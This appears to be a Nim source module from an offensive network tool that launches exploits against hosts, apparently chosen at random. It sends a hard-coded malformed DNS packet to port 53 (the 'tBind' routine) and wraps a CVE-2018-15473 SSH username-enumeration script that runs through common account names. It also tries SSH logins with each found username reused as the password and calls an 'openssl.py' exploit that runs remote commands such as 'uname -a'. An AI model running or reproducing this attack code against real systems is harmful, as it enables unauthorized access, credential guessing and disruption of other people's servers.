{.deadCodeElim: off, hints: on, warnings: on.}

import strutils, nativesockets, net, fab, osproc, sequtils

import randip_err

const
  expDir* = "../tools/exploits/"
  py2* = "/usr/bin/python2"
  py3* = "/usr/bin/python3"
  userList* = ["root", "admin", "ubnt", "oracle", "pi", "test", "user"]
  userLen* = userList.len()

var
  sshResults*: seq[string]
  sshPos*: seq[string]
  sshBool*: seq[bool]
  sshSig*: int
  v: int
  done: bool
  sshVer = ""

sshResults = @[]
sshPos = @[]
sshBool = @[]

proc grabSshVer*(grab: string): string {.discardable.} =
  sshVer = grab

proc tBind(host: string): bool {.discardable.} =
  green("Executing tBind on $#" % host )
  let payload = ("4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41")
  let sock = newSocket(AF_INET, SOCK_DGRAM)
  try:
    sock.sendTo(host, Port(53), payload)
    green("tBind Executed\n")
    return true
  except:
    errorHandler(4, host)
    return true
  finally:
    sock.close()
#
#Begin CVE:2018-15473#
#
proc seqLenCheck() =
  if sshResults.len() != 0:
    sshResults.delete(0, sshResults.len() - 1)
  else:
    discard
  if sshBool.len() != 0:
    sshBool.delete(0, sshBool.len() - 1)
  else:
    discard
  if sshPos.len() != 0:
    sshPos.delete(0, sshPos.len() - 1)
  else:
    discard

proc sshLogic(result: string, user: string) =
  if result.contains("[-]"):
    sshBool.add(false)
    sshResults.add(result)
  elif result.contains("[*]"):
    sshBool.add(false)
    sshResults.add(result)
  elif result.contains("[+]"):
    sshBool.add(true)
    sshResults.add(result)
  else:
    echo "Debug: We should never reach here"

proc sshLogic2(host: string, sshVer: string) =
  v = 0
  sshSig = 0
  done = false
  for i in sshResults:
    while v != userLen and true:
      if sshBool[v] == true:
        var
          result0 = format(i)
          result1 = userList[v]
          result2 = join([result0, ": ", result1])
        green(result2)
        sshPos.add(userList[v])
        echo "\n"
        v = v + 1
      elif i.contains("[-] Failed to negotiate SSH transport"):
        sshSig = 1
        discard false
        v = v + 1
      elif i.contains("[-] Failed to connect"):
        sshSig = 2
        discard false
        v = v + 1
      else:
        v = v + 1
  if sshSig == 1:
    red("[-]Not vulnerable...\n")
  elif sshSig == 2:
    red("[-] Failed to connect...\n")
  else:
    if sshBool.count(false) == userLen:
      if sshResults.contains("[*]"):
        red("[*]All usernames invalid... possibly vulnerable...\n")
    else:
      discard
      yellow("Debug: $#" % $sshResults)

proc sshEnum*(host: string, sshVer: string) =
  seqLenCheck()
  var script = "../tools/exploits/ssh_enum.py"
  for user in userList:
    var command = "$# -W ignore $# $# $#" % [py2, script, host, user]
    let result = execProcess(command).strip()
    sshLogic(result, user)
  sshLogic2(host, sshVer)

proc sshEnum*(host: string, user: string, sshVer: string) =
  seqLenCheck()
  var
    script = "../tools/exploits/ssh_enum.py"
  if user == "userList":
    for user in userList:
      var command = "$# -W ignore $# $# $#" % [py2, script, host, user]
      let result = execProcess(command).strip()
      sshLogic(result, user)
    sshLogic2(host, sshVer)
  else:
    var command = "$# -W ignore $# $# $#" % [py2, script, host, user]
    let result = execProcess(command).strip()
    sshLogic(result, user)
    sshLogic2(host, sshVer)
#End CVE:2018-15473#
#

proc sshLogin*(host: string, user: string, pass: string) =
  var
    script = "../tools/exploits/sshLogin2.py"
    command = "$# -W ignore $# $# $# $#" % ["python2", script, host, user, pass]
    result = execProcess(command).strip()
  if result.contains("timed out"):
    echo "[!] Timed out..."
  elif result.contains("Authentication failed"):
    echo "[!] Authentication failed..."
  elif result.contains("Bad authentication"):
    echo "[!] Bad authentication..."
  elif result.contains("No handlers could be found"):
    discard
  elif result.contains("[Errno None] Unable to connect to port 22"):
    echo "[!] Unable to connect to port 22..."
  elif result.contains("Error reading SSH protocol banner"):
    echo "[!] Error reading SSH protocol banner..."
  elif result.contains("EOFError"):
    echo "[!] EOFError..."
  elif result.contains("Authentication timeout"):
    echo "[!] Authentication timeout..."
  elif result.contains("[Errno 101] Network is unreachable"):
    echo "[!] Network is unreachable..."
  elif result.contains("kex_exchange_identification: read: Connection reset by peer"):
    echo "[!] Connection reset by peer"
  else:
    echo "\n" & host
    echo result & "\n"
    let curErr = getCurrentExceptionMsg()
    echo curErr

proc sslResults(results: string) =
  if results.contains("TCPForwarding"):#use contains() when accessing results
    red("[-]TCPForwarding disabled on remote server, Not Vulnerable...\n")
  elif results.contains("Unable to connect."):
    red("[-]Unable to connect.\n")
  elif results.contains("Timed out"):
    red("[-]Timed Out...\n")
  elif results.contains("EOFError"):
    red("[-]EOFError...\n")
  else:
    echo results

proc openSSL*(host: string) =
  var script = "../tools/exploits/openssl.py"
  var port = "22"
  var payload = "uname -a"
  var command = "$# -W ignore $# $# $# $#" % [py3, script, host, port, payload]
  let results = execProcess(command)
  sslResults(results)

proc openSSL*(host: string, port: string, payload: string) =
  var script = "../tools/exploits/openssl.py"
  var command = "$# -W ignore $# $# $# $#" % [py3, script, host, port, payload]
  let results = execProcess(command)
  sslResults(results)

#exploitHandler is used as an API for bringing in other exploits
proc exploitHandler*(host: string, port: string, payload: string, exploit: string): bool {.discardable.} =
  if exploit == "openSSL":
    white("Running openSSL exploit on $#\n" % [host])
    openSSL(host, port, payload)
    return true
  else:
    return true

proc exploitHandler*(host: string, port: int, exploit: string): bool {. discardable .} =
  discard

proc exploitHandler*(host: string, user: string, exploit: string): bool {. discardable .} =
  if exploit == "sshEnum":
    white("Beginning SSH Enumeration exploit on $#\n" % [host])
    sshEnum(host, user)
    return true
  else:
    return true

proc exploitHandler*(host: string, exploit: string): bool {. discardable .} =
  if exploit == "tBind":
    tBind(host)
    return true
  elif exploit == "sshEnum":
    white("Beginning SSH Enumeration exploit on $#\n" % [host])
    sshEnum(host, sshVer)
    return true
  elif exploit == "openSSL":
    white("Running openSSL exploit on $#\n" % [host])
    openSSL(host)
    return true
  elif exploit == "sshLogin":
    var
      user = ""
      pass = ""
      x = 0
    while x != len(sshPos):
      for i in sshPos:
        user = i
        pass = i
        white("Running sshLogin on $# with user: $# pass: $#\n" % [host, user, pass])
        sshLogin(host, user, pass)
        x = x + 1
    return true
  else:
    return true
